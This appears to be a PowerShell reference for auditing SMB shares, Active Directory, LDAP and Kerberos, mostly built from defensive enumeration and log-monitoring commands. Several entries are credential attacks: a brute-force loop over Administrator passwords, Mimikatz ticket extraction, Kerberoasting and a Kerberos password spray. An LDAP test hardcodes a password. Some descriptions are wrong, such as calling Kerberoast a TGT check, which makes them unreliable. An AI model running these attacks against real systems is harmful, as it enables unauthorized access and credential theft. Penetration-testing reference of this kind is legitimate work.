**Script/Command:**

```powershell
Get-SmbShare
```

**Description:**

Lists all available SMB shares on a remote server, providing details such as share names, paths, and access permissions for security assessment.

**Example:**

Enumerate shares to identify misconfigurations or vulnerable permissions.

**Script/Command:**

```powershell
Get-SmbConnection
```

**Description:**

Retrieves details about active SMB connections, including the dialect version, to assess the security of SMB versions in use.

**Example:**

Check if the system uses an outdated or insecure SMB version.

**Script/Command:**

```powershell
$computers = Get-Content computers.txt
$passwords = Get-Content passwords.txt
foreach ($computer in $computers) {
    foreach ($password in $passwords) {
        $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ("$computer\Administrator", (ConvertTo-SecureString $password -AsPlainText -Force))
        try {
            Invoke-Command -ComputerName $computer -Credential $credential -ScriptBlock { Get-SmbShare }
        } catch {
            Write-Host "Failed to connect to $computer with password $password"
        }
    }
}
```

**Description:**

Automates password auditing by attempting to connect to SMB shares with a list of weak or default passwords, logging failed attempts.

**Example:**

Test for weak credentials on multiple systems.

**Script/Command:**

```powershell
Invoke-SMBScanner -Target 192.168.107.100-192.168.107.150
```

**Description:**

Performs SMB vulnerability scanning to identify issues like EternalBlue or SMBGhost using third-party tools integrated with PowerShell.

**Example:**

Scan a range of IP addresses for SMB exploits.

**Script/Command:**

```powershell
Get-SmbClientConfiguration
```

**Description:**

Retrieves SMB client configuration details, including signing and encryption settings, to verify security features.

**Example:**

Check if RequireSecuritySignature and EncryptData are enabled.

**Script/Command:**

```powershell
Get-SmbSession
```

**Description:**

Enumerates active SMB sessions, providing insights into current users or unauthorized connections.

**Example:**

Monitor for suspicious access to shared resources.

**Script/Command:**

```powershell
Get-SmbShare | Where-Object { $_.IsGuestOnly -eq $true }
```

**Description:**

Filters SMB shares to identify those allowing only guest access, highlighting potential security risks.

**Example:**

Detect insecure guest-accessible shares.

**Script/Command:**

```powershell
$shareName = "ShareName"
(Get-SmbShare -Name $shareName).Path | Get-Acl
```

**Description:**

Retrieves the Access Control List (ACL) for a specific SMB share to evaluate permissions.

**Example:**

Review permissions on a named share.

**Script/Command:**

```powershell
$interval = 60
while ($true) {
    Get-SmbSession
    Start-Sleep -Seconds $interval
}
```

**Description:**

Continuously monitors SMB sessions at a specified interval to detect unexpected connections.

**Example:**

Run as a background task to track session activity.

**Script/Command:**

```powershell
$filePath = "C:\Test\ImportantFile.txt"
$initialSize = (Get-Item $filePath).Length
while ($true) {
    $currentSize = (Get-Item $filePath).Length
    if ($currentSize -ne $initialSize) {
        Write-Host "File size changed. Possible ransomware activity detected."
    }
    Start-Sleep -Seconds 300
}
```

**Description:**

Monitors a file's size for unexpected changes, potentially indicating ransomware activity.

**Example:**

Alert on modifications to a critical file.

**Script/Command:**

```powershell
Get-ADObject -Filter {ObjectClass -eq 'user'} -SearchBase 'OU=Employees,DC=snowcapcyber,DC=com'
```

**Description:**

Enumerates all user objects within a specified Organizational Unit (OU) in Active Directory.

**Example:**

List users in the Employees OU.

**Script/Command:**

```powershell
Get-ADUser -Filter {PasswordNeverExpires -eq $true}
```

**Description:**

Identifies AD user accounts with passwords set to never expire, a potential security risk.

**Example:**

Find accounts needing password policy enforcement.

**Script/Command:**

```powershell
$90DaysAgo = (Get-Date).AddDays(-90)
Get-ADUser -Filter {LastLogonDate -lt $90DaysAgo} -Properties LastLogonDate
```

**Description:**

Finds AD users inactive for over 90 days based on their last logon date.

**Example:**

Identify and disable stale accounts.

**Script/Command:**

```powershell
Get-ADGroupMember -Identity 'ITAdmins'
```

**Description:**

Lists all members of a specified AD group to audit access privileges.

**Example:**

Verify authorized users in the ITAdmins group.

**Script/Command:**

```powershell
Get-ADGroupMember -Identity 'Administrators'
```

**Description:**

Retrieves all members of the Administrators group for privileged account review.

**Example:**

Audit administrative roles.

**Script/Command:**

```powershell
Get-ADDefaultDomainPasswordPolicy
```

**Description:**

Displays the password policy settings for the AD domain, including complexity and length requirements.

**Example:**

Check domain password security settings.

**Script/Command:**

```powershell
Get-ACL 'AD:\CN=Users,DC=snowcapcyber,DC=com' | Select-Object -ExpandProperty Access | Where-Object { $_.ActiveDirectoryRights -like 'ReadProperty' }
```

**Description:**

Assesses LDAP permissions by identifying users or groups with read access to the CN=Users container.

**Example:**

Detect unauthorized read permissions.

**Script/Command:**

```powershell
$ldapServer = 'ldap://ldap.snowcapcyber.com'
$username = 'ajcblyth'
$password = 'MYpassword123'
try {
    $ldap = [ADSI]($ldapServer)
    $ldap.Username = $username
    $ldap.Password = $password
    $ldap.AuthenticationType = [System.DirectoryServices.AuthenticationTypes]::Secure
    $ldap.Bind()
    Write-Host "LDAP auth success for $username"
} catch {
    Write-Host "LDAP auth failed for $username"
}
```

**Description:**

Tests LDAP authentication by attempting to bind with specified credentials.

**Example:**

Verify the validity of LDAP credentials.

**Script/Command:**

```powershell
Test-NetConnection -ComputerName ldap.snowcapcyber.com -Port 389
```

**Description:**

Checks for unsecured LDAP service running on port 389.

**Example:**

Identify exposure of unencrypted LDAP.

**Script/Command:**

```powershell
Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq 2887 }
```

**Description:**

Monitors LDAP channel binding failures in security event logs.

**Example:**

Detect unauthorized LDAP access attempts.

**Script/Command:**

```powershell
Test-NetConnection -ComputerName ldap.snowcapcyber.com -Port 636
```

**Description:**

Verifies if LDAPS is configured and running on port 636.

**Example:**

Ensure encrypted LDAP traffic.

**Script/Command:**

```powershell
$threshold = 3
$logPath = "C:\Logs\FailedLogins.log"
$failedLogins = Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq 4625 }
if ($failedLogins.Count -ge $threshold) {
    $failedLogins | Out-File -Append $logPath
    Send-MailMessage -To 'admin@snowcapcyber.com' -From 'alerts@snowcapcyber.com' -Subject 'Security Alert: Multiple Failed Logins Detected' -Body "Multiple failed login attempts detected. Check $logPath for details."
}
```

**Description:**

Monitors security logs for multiple failed login attempts and sends alerts if a threshold is exceeded.

**Example:**

Detect potential brute-force attacks.

**Script/Command:**

```powershell
Get-KerberosTicket | Format-Table -Property UserName, ServiceName, StartTime, EndTime
```

**Description:**

Enumerates active Kerberos tickets, showing user and service details with start and end times.

**Example:**

Review active authentication sessions.

**Script/Command:**

```powershell
Get-ADServiceAccount -Filter *
```

**Description:**

Lists all service accounts and their Service Principal Names (SPNs) in AD.

**Example:**

Identify misconfigured SPNs.

**Script/Command:**

```powershell
Invoke-Mimikatz -Command '"ajcblyth::tickets"'
```

**Description:**

Extracts Kerberos tickets and credentials from memory using Mimikatz.

**Example:**

Harvest credentials for security testing.

**Script/Command:**

```powershell
Import-Module PowerSploit
Invoke-Kerberoast
```

**Description:**

Checks for crackable Kerberos Ticket Granting Tickets (TGTs) to detect vulnerabilities.

**Example:**

Identify potential golden ticket attack vectors.

**Script/Command:**

```powershell
$ticket = Get-KerberosTicket
$renewalDuration = (New-TimeSpan -Start $ticket.StartTime -End $ticket.EndTime).TotalMinutes
if ($renewalDuration -gt 1440) {
    Write-Host "Abnormally renewal detected."
}
```

**Description:**

Analyzes the renewal duration of Kerberos tickets to detect anomalies.

**Example:**

Flag unusually long ticket renewals.

**Script/Command:**

```powershell
Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4769 }
```

**Description:**

Filters security event logs for Kerberos-related events, such as failed authentications.

**Example:**

Investigate suspicious Kerberos activities.

**Script/Command:**

```powershell
Invoke-SprayKerberos -UserList users.txt -Password Summer2023 -Domain snowcapcyber.com
```

**Description:**

Performs a password spray attack against Kerberos to test weak credentials.

**Example:**

Identify users with weak passwords.
